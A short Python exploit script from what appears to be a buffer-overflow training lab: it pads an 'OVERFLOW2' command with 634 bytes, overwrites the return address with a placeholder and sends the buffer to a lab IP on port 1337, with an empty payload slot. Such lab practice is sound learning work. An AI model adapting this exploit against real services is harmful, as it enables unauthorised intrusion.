#!/usr/bin/python3

import sys,socket
from pattern import pattern_gen #Place pattern.py in the same directory as this script.

SRP_offset = 634    #Take take offset value from EIP. --> Command: !mona findmsp
ESP = b"BBBB"

payload = b""
"""payload = (pattern_gen(1100)).encode() # Length must be 400 bytes longer that the string that crushed the server during fuzzing. """ 



buff = b"OVERFLOW2 "                 #Prefix
buff += ("A" * SRP_offset).encode()  #Padding
buff += ESP                          #ESP points here  
buff += payload                      #Payload                              
buff += b"\r\n"                      #Postfix

IP="10.10.238.44"
port=1337

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP, port))
                            s.send ((buff))
                            print("Done!")
                            s.close()
         
except:
                            print ("Error connecting to server")
                            sys.exit()


